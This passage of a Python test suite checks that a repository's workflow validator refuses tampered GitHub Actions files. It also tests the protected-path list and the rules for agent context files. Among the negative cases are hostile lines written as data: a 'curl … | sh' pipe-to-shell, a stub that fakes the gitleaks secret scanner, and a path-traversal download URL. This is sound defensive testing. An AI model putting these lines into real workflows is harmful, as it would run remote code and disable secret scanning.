            self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"), text)

    def test_a_live_workflow_is_held_to_the_rules(self):
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        problems = check_workflows.run(tree({".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
        self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"))
        self.assertTrue(caught(problems, "holds workflows and not verify.yml"))
        self.assertTrue(caught(check_workflows.run(tree({".github/actions/setup/action.yml": "x"})), "a local action"))

    def test_the_secret_scan_has_rules(self):
        # gitleaks adds its default rules to a config file only when told to; without them it finds nothing.
        config = (ROOT / ".gitleaks.toml").read_text()
        self.assertRegex(config, r"(?m)^\[extend\]\s*\nuseDefault = true$", "the secret scan would run with no rules")
        self.assertNotRegex(config, r"(?m)^\s*disabledRules\s*=", "a default rule is switched off")
        # What is ignored is ignored one finding at a time, by its exact fingerprint: a commit, a file, a rule, a line.
        for line in (ROOT / ".gitleaksignore").read_text().splitlines():
            if line and not line.startswith("#"):
                self.assertRegex(line, r"^[0-9a-f]{40}:[^:]+:[a-z0-9-]+:[0-9]+$", line)

    def test_an_exempt_workflow_is_held_word_for_word(self):
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        as_written = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan})))
        self.assertFalse(caught(as_written, "ci.yml"))
        changed = scan.replace("gitleaks detect", "curl https://example.invalid | sh; gitleaks detect")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": changed}))),
                               "ci.yml is exempt from a rule, so it is held word for word"))
        # The exemption is from one rule. Under another name the same text is refused.
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/scan.yml": scan}))),
                               "scan.yml: [install]"))
        other = scan.replace("ubuntu-24.04", "ubuntu-latest")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": other}))),
                               "ci.yml: [runner]"))

    def test_the_secret_scan_reads_the_bases_configuration(self):
        # gitleaks 8.30.1 reads the .gitleaksignore it is told of, and also the one at the top of what it scans, so the
        # scan deletes the head's and reads its rules from a checkout of the base: a change cannot widen the allowlist it
        # needs (decision 0023). The history it scans is still the head's.
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertEqual(check_workflows.scan_problems(scan), [])
        line = "          " + check_workflows.SCAN_RUN[1] + "\n"
        rm = "          " + check_workflows.SCAN_RUN[0] + "\n"
        ref = "          ref: %s\n" % check_workflows.SCAN_BASE
        start = scan.index("      - name: Checkout the base")
        step = scan[start:scan.index("      - name: Install gitleaks")]
        head = scan[scan.index("      - name: Checkout (full history)"):start]
        install = scan[scan.index("      - name: Install gitleaks"):scan.index("      - name: Run gitleaks")]
        self.assertIn(rm + line, scan)
        self.assertIn(ref, step)
        ran, checkout = "does not run, as its last step's whole literal block", "does not check out the head and then the base"
        shape = "does not run, in this order and nothing else"
        installed = "does not install gitleaks by INSTALL_RUN, word for word"
        cases = [(scan.replace("--config base/.gitleaks.toml", "--config .gitleaks.toml"), ran),
                 (scan.replace("--gitleaks-ignore-path base/.gitleaksignore", "--gitleaks-ignore-path ."), ran),
                 (scan.replace(" --gitleaks-ignore-path base/.gitleaksignore", ""), ran),
                 (scan.replace(rm, ""), ran),
                 (scan.replace(rm + line, line + rm), ran),
                 (scan.replace(rm + line, "          gitleaks dir .\n"), ran),
                 # A head's .gitattributes marks a file -diff, and git log -p shows it as binary: --text reads it.
                 (scan.replace(" --text\"", "\""), ran),
                 (scan.replace(" --log-opts=\"--full-history --all --diff-filter=tuxdb --text\"", ""), ran),
                 (scan.replace("--full-history --all ", ""), ran),
                 # An inline gitleaks:allow is the head's own content, and passes over nothing.
                 (scan.replace(" --ignore-gitleaks-allow", ""), ran),
                 (scan.replace(rm + line, "          make verify\n"), ran),
                 # The scan's whole block is SCAN_RUN: a line before the rm, or after the scan, is refused.
                 (scan.replace(rm, "          cp .gitleaks.toml base/.gitleaks.toml\n" + rm), ran),
                 (scan.replace(line, line + "          true\n"), ran),
                 (scan.replace("        run: |\n" + rm + line, "        run: gitleaks detect --source .\n"), ran),
                 # An install on one line is read: it is held whole too.
                 (scan.replace(install, "      - name: Install gitleaks\n        run: cp .gitleaks.toml base/\n"),
                  installed),
                 # The steps are the head's checkout, the base's, the install and the scan, in that order alone.
                 (scan.replace(step, "").replace(rm + line, rm + line + step),
                  shape),
                 (scan.replace(step, step + "      - run: cp .gitleaks.toml base/.gitleaks.toml\n"), shape),
                 (scan.replace("          sudo mv /tmp/gitleaks /usr/local/bin\n",
                               "          sudo mv /tmp/gitleaks /usr/local/bin\n          cp .gitleaks.toml base/\n"),
                  installed),
                 (scan.replace("    permissions:\n      contents: read\n",
                               "    permissions:\n      contents: read\n    env:\n      GIT_DIR: base/.git\n"), shape),
                 (scan.replace("permissions: {}\n", "permissions: {}\ndefaults:\n  run:\n    working-directory: base\n"),
                  shape),
                 (scan.replace("      - name: Run gitleaks\n", "      - name: Run gitleaks\n        working-directory: base\n"),
                  shape),
                 (scan.replace("          GITLEAKS_VERSION:", "          GIT_DIR: base/.git\n          GITLEAKS_VERSION:"),
                  shape),
                 (scan.replace(ref, ref.replace(" || github.sha", "")), checkout),
                 (scan.replace(ref, ref.replace(" || github.event.merge_group.base_sha", "")), checkout),
                 (scan.replace(ref, ref.replace("github.event.pull_request.base.sha || ", "")), checkout),
                 (scan.replace(ref, ref.replace("pull_request.base.sha", "pull_request.head.sha")), checkout),
                 (scan.replace("          path: base\n", ""), checkout),
                 (scan.replace("          path: base\n", "          path: base\n          repository: someone/else\n"),
                  checkout),
                 (scan.replace(step, ""), checkout),
                 (scan.replace(head + step, step + head), checkout),
                 (scan.replace(step, step + step.replace("path: base", "path: other")), checkout)]
        for text, said in cases:
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # The check reads it where it stands, and only there.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        widened = scan.replace("--config base/.gitleaks.toml", "--config .gitleaks.toml")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": widened}))),
                               ".github/workflows/ci.yml: ci.yml " + ran))
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan}))), "ci.yml"))

    def test_the_secret_scans_install_is_held_whole(self):
        # The install's whole block is INSTALL_RUN: a stub gitleaks that exits 0 would pass every scan. Only the version
        # and the checksum it reads from its env are free, each held to its shape and quoted: the version goes into the
        # URL's path, where curl folds `/../`.
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertEqual(check_workflows.scan_problems(scan), [])
        block = "".join("          %s\n" % line for line in check_workflows.INSTALL_RUN)
        self.assertIn("        run: |\n" + block + "      - name: Run gitleaks\n", scan)
        version = '          GITLEAKS_VERSION: "8.30.1"\n'
        checksum = '          GITLEAKS_CHECKSUM: "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb"\n'
        self.assertIn(version + checksum, scan)
        installed = "does not install gitleaks by INSTALL_RUN, word for word"
        stub = "          printf 'exit 0' | sudo tee /usr/local/bin/gitleaks\n          sudo chmod +x /usr/local/bin/gitleaks\n"
        cases = [(scan.replace(block, stub), installed),
                 (scan.replace(block, block + "          true\n"), installed),
                 (scan.replace(block, "          true\n" + block), installed),
                 (scan.replace("sha256sum -c", "sha256sum -c || true"), installed),
                 (scan.replace(" --proto '=https'", ""), installed),
                 (scan.replace("v${GITLEAKS_VERSION}", "v8.30.1"), installed),
                 (scan.replace("https://github.com/gitleaks/gitleaks/", "https://github.com/someone/gitleaks/"), installed),
                 (scan.replace(version, version.replace("8.30.1", "8.30.1/../../../someone/gitleaks/releases/download/v1")),
                  "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace('"8.30.1"', "8.30.1")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace("8.30.1", "8.30")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace("8.30.1", "8.3O.1")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version + version), "GITLEAKS_VERSION once"),
                 (scan.replace(version, ""), "GITLEAKS_VERSION once"),
                 (scan.replace(checksum, checksum.replace("551f6fc8", "551F6FC8")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace("551f6fc8", "551f6fz8")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace("eb\"", "\"")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace('"', "")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, ""), "GITLEAKS_CHECKSUM once")]
        for text, said in cases:
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # read() leaves a line with a tab or a carriage return out of a block, and bash runs it: a file with one holds
        # neither block. A folded block, `>`, is one command, not the lines it is written in.
        tabbed = "          \tprintf 'exit 0' | sudo tee /usr/local/bin/gitleaks\n"
        last = "          sudo mv /tmp/gitleaks /usr/local/bin\n"
        scanned = "          " + check_workflows.SCAN_RUN[1] + "\n"
        ran = "does not run, as its last step's whole literal block"
        for text, said in ((scan.replace(last, last + tabbed), installed),
                           (scan.replace(last, last + tabbed), ran),
                           (scan.replace(scanned, scanned + tabbed), ran),
                           (scan.replace(scanned, scanned + tabbed), installed),
                           (scan.replace(last, last.replace("\n", "\r\n")), installed),
                           (scan.replace("        run: |\n" + block, "        run: >\n" + block), installed),
                           (scan.replace("        run: |\n          rm -f", "        run: >\n          rm -f"), ran),
                           (scan.replace("        run: |\n          rm -f", "        run: |-\n          rm -f"), ran)):
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # The same, read from the file as run() reads it: a carriage return must reach read() untranslated.
        root = clone({".github/workflows/ci.yml": scan.replace(last, last.replace("\n", "\r\n"))})
        self.assertTrue(caught(check_workflows.run(root), installed), "a carriage return in ci.yml")
        crlf = clone({".github/workflows/verify.yml": GOOD.replace("\n", "\r\n")})
        self.assertTrue(caught(check_workflows.run(crlf), "verify.yml: [form]"), "windows line ends in a workflow")
        # Another version and checksum of their shapes are free: that is a bump, the reviewer's to judge.
        bumped = scan.replace(version, version.replace("8.30.1", "8.31.0")).replace(checksum, checksum.replace(
            "551f6fc8", "0123abcd"))
        self.assertNotEqual(bumped, scan)
        self.assertEqual(check_workflows.scan_problems(bumped), [])

    def test_every_checkout_is_the_listed_one(self):
        # PIN makes any two pins equal where a text is compared word for word, so neither the EXEMPT hash nor verify.yml's
        # example holds which actions/checkout a workflow runs; CHECKOUT does, in every workflow.
        listed = "%s %s" % check_workflows.CHECKOUT
        old = "actions/checkout@ee0669bd1cc54295c223e0bb666b733df41de1c5 # v2.7.0"
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        verify = (ROOT / ".github" / "workflows" / "verify.yml").read_text()
        ref = "          ref: %s\n" % check_workflows.BASE
        base_checkout = "      - uses: %s\n        with:\n          persist-credentials: false\n%s" % (listed, ref)
        self.assertEqual(verify.count(base_checkout), 1)
        self.assertEqual(scan.count(listed), 2)
        self.assertNotIn("pin", rules(scan))
        self.assertEqual(rules(verify), [])
        for text in (scan.replace(listed, old, 1), scan.replace(listed, old),
                     verify.replace(base_checkout, base_checkout.replace(listed, old)),
                     verify.replace(listed, "actions/checkout@" + "a" * 40 + " # v7.0.1"),
                     verify.replace(listed, listed.replace("v7.0.1", "v2.7.0")),
                     verify.replace(listed, listed.replace("actions/checkout", "Actions/Checkout"))):
            self.assertIn("pin", rules(text), text)
        # The hash of the exempt scan does not see it; the pin rule does.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        problems = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan.replace(listed, old)})))
        self.assertFalse(caught(problems, "held word for word"))
        self.assertTrue(caught(problems, ".github/workflows/ci.yml: [pin] %s is not the listed checkout" % old))
        # Another action keeps any pin that was looked up.
        other = GOOD.replace(STEP, "      - uses: actions/setup-java@" + "a" * 40 + " # v6.0.1\n" + STEP)
        self.assertEqual(rules(other), [])

    def test_a_rule_is_not_dodged_by_writing_the_workflow_another_way(self):
        ways = {
            "a mapping on one line": (GOOD.replace(STEP, "      - {uses: evil/action@main, continue-on-error: true}\n"), "form"),
            "two spaces after the dash": (GOOD.replace(STEP, "      -  uses: actions/checkout@v7\n"), "form"),
            "a quoted key": (GOOD.replace("    runs-on:", '    "runs-on":'), "form"),
            "a colon set apart": (GOOD.replace(STEP, "      - uses : evil/action@main\n"), "form"),
            "an escaped event name": (GOOD.replace("  merge_group:\n", '  merge_group:\n  "pull_request\\x5ftarget":\n'), "form"),
            "a list on one line": (GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule: [{cron: '0 * * * *'}]\n"), "form"),
            "an anchor": (GOOD.replace(STEP, "      - run: &cmd make verify\n      - run: *cmd\n"), "form"),
            "another installer": (GOOD.replace(STEP, "      - run: pipx install ruff\n"), "install"),
            "a download in python": (GOOD.replace(STEP, '      - run: python3 -c "import urllib.request"\n'), "install"),
            "a failure swallowed in shell": (GOOD.replace(STEP, "      - run: make verify || true\n"), "install"),
            "read-all": (GOOD.replace("permissions: {}", "permissions: read-all"), "permissions"),
            "write-all on a job": (GOOD.replace("      contents: read\n", "      write-all\n"), "form"),
            "woken by another workflow": (GOOD.replace("  merge_group:\n", "  merge_group:\n  workflow_run:\n"), "target"),
            "every thirty minutes": (GOOD.replace("  merge_group:\n", '  merge_group:\n  schedule:\n    - cron: "0,30 * * * *"\n'), "cron"),
            "a runner from a matrix": (GOOD.replace("ubuntu-24.04", "${{ matrix.os }}"), "runner"),
            "a runner in a list": (GOOD.replace("    runs-on: ubuntu-24.04\n", "    runs-on:\n      - ubuntu-latest\n"), "runner"),
            "a token in lower case": (GOOD.replace(STEP, STEP + "        env:\n          T: ${{ secrets.gh_pat }}\n"), "token"),
            "inherit in quotes": (GOOD.replace("  verify:\n", '  c:\n    uses: ./.github/workflows/o.yml\n    secrets: "inherit"\n  verify:\n'), "token"),
            "a branch filter": (GOOD.replace("  pull_request:\n", "  pull_request:\n    branches:\n      - release\n"), "queue"),
            "an expression in a script": (GOOD.replace(STEP, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n        with:\n          script: ${{ github.event.comment.body }}\n"), "expression"),
            "a checkout in quotes": (GOOD.replace("actions/checkout@", '"actions/checkout@').replace(" # v7.0.1\n        with:\n          persist-credentials: false", '" # v7.0.1'), "credentials"),
            "a limit named in a comment": (GOOD.replace("    timeout-minutes: 15\n", "").replace("ubuntu-24.04\n", "ubuntu-24.04 # timeout-minutes: later\n"), "timeout"),
            "windows line ends": (GOOD.replace("\n", "\r\n"), "form"),
            "nothing at all": ("", "form"),
        }
        for name, (text, rule) in ways.items():
            self.assertIn(rule, rules(text), name)

    def test_a_workflow_that_keeps_the_rules_is_not_refused(self):
        fine = {
            "continue-on-error: false": GOOD.replace(STEP, STEP + "        continue-on-error: false\n"),
            "a comment naming a banned event": GOOD.replace("  pull_request:\n", "  pull_request:    # never pull_request_target\n"),
            "a secret whose name holds the letters": GOOD.replace(STEP, STEP + "        env:\n          K: ${{ secrets.RELAY_DISPATCH_KEY }}\n"),
            "the org's reusable at its channel": GOOD.replace("  verify:\n", "  shield:\n    uses: combsmith/.github/.github/workflows/agent-shield-reusable.yml@agent-shield/v2-stable\n  verify:\n"),
            "an off-zero schedule": GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule:\n    - cron: '17,47 * * * *'\n"),
            "indented by four": "\n".join((len(l) - len(l.lstrip(" "))) * " " + l for l in GOOD.split("\n")),
        }
        for name, text in fine.items():
            self.assertEqual(rules(text), [], name)


class TheList(unittest.TestCase):
    """The protected paths and every Lens's input: one list, in config/hooks.json, that the session hooks read and the
    Kernel is given as `protected_paths` (decision 0020)."""

    HOOKS = json.loads((ROOT / "config" / "hooks.json").read_text())
    # The paths each criterion of the review's rubric applies to, read with the same matcher (decision 0029).
    RUBRIC = [p for c in json.loads((ROOT / "config" / "rubric-pr-review.json").read_text())["criteria"]
              for p in c.get("applies_when", {}).get("paths", [])]

    def test_the_kernels_matcher_and_the_hooks_agree_on_one_corpus(self):
        # Only the two matchers can drift, so they are held to each other: on every file in the repo, and on paths made
        # from each pattern, its wildcard standing for nothing, a letter or more than one name, in any case, below it,
        # beside it and above it. The rubric's patterns are among them, and `**` as a whole name.
        data = protected.load()
        patterns = [p for p, _ in data["protected"] + data["reported"]] + ["a/*", "*.json", "x*y*z/", "a*/b*/", "*"]
        patterns += self.RUBRIC + ["**", "**/", "a/**/b*/", "**/a/**", "a**b/c", "**/**/x"]
        self.assertLessEqual({"**/*.py", "kernel/**", "**/AGENTS.md"}, set(self.RUBRIC))
        corpus = {p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)}
        for pattern in patterns:
            for star in ("", "x", "x/y", "a.b", "*"):
                stem = pattern.replace("*", star)
                for end in ("", "/a", "/a/b.json", "x", ".bak"):
                    for path in (stem.rstrip("/") + end, "x/" + stem.rstrip("/") + end):
                        corpus |= {path, path.upper(), path.title()}
        corpus = sorted(p for p in corpus if derive.readable_name(p))
        self.assertGreater(len(corpus), 1000)
        for pattern in patterns:
            whole = protected.entries([(pattern, "")])[0][3]
            for path in corpus:
                self.assertEqual(derive.matches(pattern, path), bool(whole.match(path.casefold())), (pattern, path))

    def test_two_stars_as_a_whole_name_stand_for_any_run_of_names(self):  # decision 0029
        # `**` as a whole name stands for any run of names, none included; within a name it is two wildcards, each
        # within that name. The hooks read it alike (test_the_kernels_matcher_and_the_hooks_agree_on_one_corpus).
        for pattern, path, fits in (("**/*.py", "a.py", True), ("**/*.py", "a/b/c.py", True), ("**/*.py", "a/b.txt", False),
                                    ("kernel/**", "kernel", True), ("kernel/**", "kernel/a/b.py", True),
                                    ("kernel/**", "kernels/a.py", False), ("**/AGENTS.md", "AGENTS.md", True),
                                    ("**/AGENTS.md", "a/b/AGENTS.md", True), ("**/AGENTS.md", "a/xAGENTS.md", False),
                                    ("a/**/b", "a/b", True), ("a/**/b", "a/x/y/b", True), ("a/**/b", "a/x/y/c", False),
                                    ("a**b", "ab", True), ("a**b", "axyb", True), ("a**b", "ax/yb", False),
                                    ("docs/**/", "docs/a/b.md", True), ("docs/**/", "doc/a.md", False)):
            self.assertEqual(derive.matches(pattern, path), fits, (pattern, path))
            whole = protected.entries([(pattern, "")])[0][3]
            self.assertEqual(bool(whole.match(path.casefold())), fits, (pattern, path))

    def test_the_kernel_is_given_every_protected_path_and_lens_input(self):
        want = [e["path"] for e in self.HOOKS["protected"]] + [e["path"] for e in self.HOOKS["lens_inputs"]]
        self.assertEqual(protected.protected_paths(), want)
        self.assertEqual(support.CONFIG["protected_paths"], want)
        self.assertEqual(world.CONFIG["protected_paths"], want)
        # What is only reported, such as a decision record, is listed at a stop and is not on the Kernel's list.
        self.assertNotIn("docs/decisions/", want)

    def test_each_lens_input_is_a_required_lens_and_verifys_cover_every_check(self):
        lenses = {lens["lens"] for lens in support.CONFIG["required_lenses"]["deterministic"]}
        inputs = {}
        for entry in self.HOOKS["lens_inputs"]:
            self.assertIn(entry["lens"], lenses, entry["path"])
            inputs.setdefault(entry["lens"], []).append(entry["path"])
        # verify runs make, which reads GNUmakefile, makefile or Makefile, and every check and test where checks live;
        # `python3 -m` puts the top of the repo first on the path, so a module there shadows the standard library; and
        # the tests import the Kernel. The secret scan reads its configuration and the findings it is told to pass over.
        for path in ["Makefile", "makefile", "GNUmakefile", "json.py", "kernel/derive.py"] + [
                "%s/x.py" % where for where in check_context.CHECKS]:
            self.assertTrue(any(derive.matches(p, path) for p in inputs["verify"]), path)
        for path in (".gitleaks.toml", ".gitleaksignore"):
            self.assertTrue(any(derive.matches(p, path) for p in inputs["secret-scan"]), path)
        # Whatever the import system loads from the top of the repo ahead of the standard library, by every suffix it
        # knows here and Windows's: a module, a regular package's __init__, and the compiled modules. A directory with
        # no __init__ is a namespace package, which a module found later on the path wins over, so it shadows nothing.
        machinery = importlib.machinery
        suffixes = (machinery.SOURCE_SUFFIXES + machinery.BYTECODE_SUFFIXES + machinery.EXTENSION_SUFFIXES
                    + [".pyw", ".pyd", ".cp312-win_amd64.pyd", ".cpython-312-x86_64-linux-gnu.so", ".abi3.so"])
        for path in (["json" + s for s in suffixes] + ["unittest/__init__" + s for s in suffixes]
                     + ["__pycache__/json.cpython-39.pyc"]):
            self.assertTrue(any(derive.matches(p, path) for p in inputs["verify"]), path)

    def test_every_package_at_the_top_of_the_repo_is_a_lens_input_whole(self):
        # verify imports every regular package at the top of the repo, through any of its modules or the bytecode
        # cached for them. A package added without its own entry fails here.
        verify = [e["path"] for e in self.HOOKS["lens_inputs"] if e["lens"] == "verify"]
        packages = sorted({p.relative_to(ROOT).parts[0] for p in walk.files(ROOT)
                           if len(p.relative_to(ROOT).parts) == 2 and p.name.startswith("__init__.")})
        self.assertLessEqual({"kernel", "sim", "tests", "tools"}, set(packages))
        for package in packages:
            for path in ("%s/x.py" % package, "%s/a/b.py" % package, "%s/__pycache__/x.cpython-39.pyc" % package):
                self.assertTrue(any(derive.matches(p, path) for p in verify), path)

    def test_each_lens_workflow_file_is_protected(self):  # decision 0018
        patterns = [e["path"] for e in self.HOOKS["protected"]]
        for lens in support.CONFIG["required_lenses"]["deterministic"]:
            if lens["workflow"] is not None:
                self.assertTrue(any(derive.matches(p, lens["workflow"]) for p in patterns), lens["lens"])


class Context(unittest.TestCase):
    def test_a_rule_with_no_check_is_caught(self):
        root = tree({"tools/check_x.py": "", "README.md": "", "docs/a.md": ""})
        held = check_context._held
        self.assertTrue(caught(held("Reviewers look for it", "rule", root, root), "names no check"))
        self.assertEqual(held("`tools/check_x.py`", "rule", root, root), [])
        # A document that exists is not a check.
        self.assertTrue(caught(held("`README.md`", "rule", root, root), "names no check"))
        self.assertTrue(caught(held("the reviewers, see `docs/`", "rule", root, root), "names no check"))

    def test_a_rule_whose_wait_is_over_is_caught(self):
        root = tree({"harness/apply.py": "", "CODEOWNERS": ""})
        held = check_context._held
        self.assertEqual(held("waiting on `roles/`", "rule", root, root), [])
        self.assertEqual(held("Waiting on `roles/`", "rule", root, root), [])
        self.assertTrue(caught(held("waiting on `harness/`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `harness/never.py`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `.github/CODEOWNERS`", "rule", root, root), "exists now"))

    def test_a_rule_that_cites_a_test_expected_to_fail_must_say_so(self):
        root = tree({"tests/t.py": "@pending\ndef test_later(self):\n    pass\n\ndef test_now(self):\n    pass\n"})
        held = check_context._held
        self.assertTrue(caught(held("`tests/t.py::test_later`", "rule", root, root), "is expected to fail"))
        self.assertEqual(held("not held yet: `tests/t.py::test_later`", "rule", root, root), [])
        self.assertTrue(caught(held("not held yet: `tests/t.py::test_now`", "rule", root, root), "names no test marked"))

    def test_a_wait_on_a_name_nothing_will_ever_have_is_caught(self):
        root = tree({"x": ""})
        self.assertTrue(caught(check_context._held("waiting on `someday/`", "rule", root, root), "not a planned"))

    def test_a_path_or_a_test_that_does_not_exist_is_caught(self):
        here = "class Real:\n    def test_present(self):\n        pass\n    # def test_gone(self): was deleted\n"
        text = ("See `tools/gone.py`, `scripts/gone.sh`, `toools/`, `harness/`, `tools/here.py:12`, [a link](docs/gone.md),\n"
                "`tools/here.py::test_missing`, `tools/here.py::test_gone`, `tools/here.py::Unreal.test_present`,\n"
                "`tools/here.py::Real.test_present` and [the rules](#12-rules). Run python3 -m tools.here.\n")
        root = tree({"docs/a.md": text, "tools/here.py": here})
        problems = check_context._references(root / "docs" / "a.md", text, root)
        self.assertEqual(len(problems), 7, problems)

    def test_a_number_without_its_title_is_caught(self):
        def found(text):
            root = tree({"docs/a.md": text})
            return check_context._references(root / "docs" / "a.md", text, root)
        for text in ("Fixed in #2225.", "See combsmith/x#2225.", "See pull request 2225.", "See PR 2225.",
                     'It "works". See pull request 2225.'):
            self.assertTrue(found(text), text)
        for text in ('See "docs: factory MVP" (pull request 2225).', "See \u201cdocs: factory MVP\u201d (issue 12)."):
            self.assertEqual(found(text), [], text)

    def test_a_root_file_too_long_to_read_in_full_is_caught(self):
        root = tree({"AGENTS.md": "line\n" * (check_context.ROOT_LINES + 1), "kernel/AGENTS.md": "x " * 200 + "\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "AGENTS.md is 61 lines; the limit is 60"))
        self.assertTrue(caught(problems, "kernel/AGENTS.md has a line over"))

    def test_a_rule_in_any_agents_file_must_name_its_check(self):
        root = tree({"AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be kind | `tools/x.py` |\n", "tools/x.py": "",
                     "tools/AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be careful | reviewers |\n",
                     "sim/AGENTS.md": "| Rule | Check |\n|---|---|\n| Be quick | `tools/x.py` |\n",
                     "tests/AGENTS.md": "- Be thorough.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "tools/AGENTS.md, rule 'Be careful': names no check"))
        self.assertTrue(caught(problems, "sim/AGENTS.md: a table of rules must end in a column headed 'Held by'"))
        self.assertTrue(caught(problems, "tests/AGENTS.md: no table of rules"))
        self.assertFalse(caught(problems, "AGENTS.md, rule 'Be kind'"))

    def test_a_date_in_what_is_always_read_is_caught(self):
        root = tree({"AGENTS.md": "Decided on 2026-10-11.\n", "CLAUDE.md": "See AGENTS.md, and also these rules.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "holds a date") and caught(problems, "CLAUDE.md must hold the one line"))

    def test_a_second_set_of_rules_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "CLAUDE.md": "@AGENTS.md\n", "kernel/CLAUDE.md": "Do as you like.\n",
                     ".github/copilot-instructions.md": "x\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "kernel/CLAUDE.md is a second set of rules"))
        self.assertTrue(caught(problems, "copilot-instructions.md is a second set of rules"))
        self.assertEqual(check_context._agents_files(tree({"x": ""})), ["AGENTS.md is missing"])

    def test_a_directory_with_no_rules_of_its_own_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "kernel/decide.py": ""})
        self.assertTrue(caught(check_context._agents_files(root), "kernel/ has no AGENTS.md"))

    def test_a_decision_with_no_boundary_is_caught(self):
        record = "# 0001. X\n\n## Decision\n\nY.\n\n## Why\n\nZ.\n"
        self.assertTrue(caught(check_context._decisions(tree({"docs/decisions/0001-x.md": record})), "names no boundary"))
        extra = record + "\n## Boundaries\n\n| B | Check |\n|---|---|\n| b | `tools/x.py` |\n\n## Not yet held\n\nA wish.\n"
        root = tree({"docs/decisions/0001-x.md": extra, "docs/decisions/0003-y.md": extra, "tools/x.py": ""})
        problems = check_context._decisions(root)
        self.assertTrue(caught(problems, "a section 'Not yet held'"))
        self.assertTrue(caught(problems, "0003-y.md: records are numbered from 0001 with no gap"))
        self.assertTrue(caught(problems, "0003-y.md: the title must open with its number"))

    def test_a_lesson_with_no_check_is_caught(self):
        text = ("### L-01 A thing broke\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n\n"
                "## L-02 Another\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n")
        problems = check_context._lessons(tree({"docs/lessons.md": text}))
        self.assertTrue(caught(problems, "L-01 has no Check"))
        self.assertTrue(caught(problems, "must be a third-level heading"))

    def test_a_standard_with_prose_and_no_example_is_caught(self):
        root = tree({"docs/standards/code.md": "# Code\n\n## Be careful\n\nPlease.\n\nHeld by: `tools/`\n", "tools/x.py": ""})
        self.assertTrue(caught(check_context._standards(root), "the example comes before the prose"))

    def test_a_standard_over_one_page_is_caught(self):
        # A standard is one page. The workflows page also shows the required check's workflow, its first yaml block,
        # word for word as check_workflows holds it, so that block is not counted there, and nothing else is.
        page = "# %s\n\n## Be careful\n\n```yaml\n%s```\n\n%sOrg standard: none. This repo's own.\nHeld by: `tools/`\n"
        block, prose = "x: 1\n" * 130, "Words.\n" * 130
        for name, text, over in (("code", page % ("Code", block, ""), True),
                                 ("workflows", page % ("Workflows", block, ""), False),
                                 ("workflows", page % ("Workflows", "x: 1\n", prose), True)):
            problems = check_context._standards(tree({"docs/standards/%s.md" % name: text, "tools/x.py": ""}))
            self.assertEqual(caught(problems, "%s.md is over one page" % name), over, name)

    def test_a_standard_that_cites_no_org_standard_is_caught(self):
        page = "# Code\n\n## Be careful\n\n```\nx\n```\n\n%sHeld by: `tools/`\n"
        bare = check_context._standards(tree({"docs/standards/code.md": page % "", "tools/x.py": ""}))
        cited = check_context._standards(tree({"docs/standards/code.md": page % "Org standard: none. This repo's own.\n",
                                               "tools/x.py": ""}))
        self.assertTrue(caught(bare, "no 'Org standard:' line") and not caught(cited, "no 'Org standard:' line"))

    def test_a_skill_the_root_file_does_not_point_to_is_caught(self):
        good = "---\nname: run-it\ndescription: Run it, when a story asks for it.\n---\n\n# Run it\n"
        pointer = "Read `.claude/skills/run-it/SKILL.md`.\n"
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": good})), [])
        quoted = good.replace("name: run-it", 'name: "run-it"').replace("description: Run it", "description: >\n  Run it")
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": quoted})), [])
        root = tree({"AGENTS.md": "Not `.claude/skills/run-it/SKILL.md.old`, nor x.claude/skills/run-it/SKILL.mdx\n",
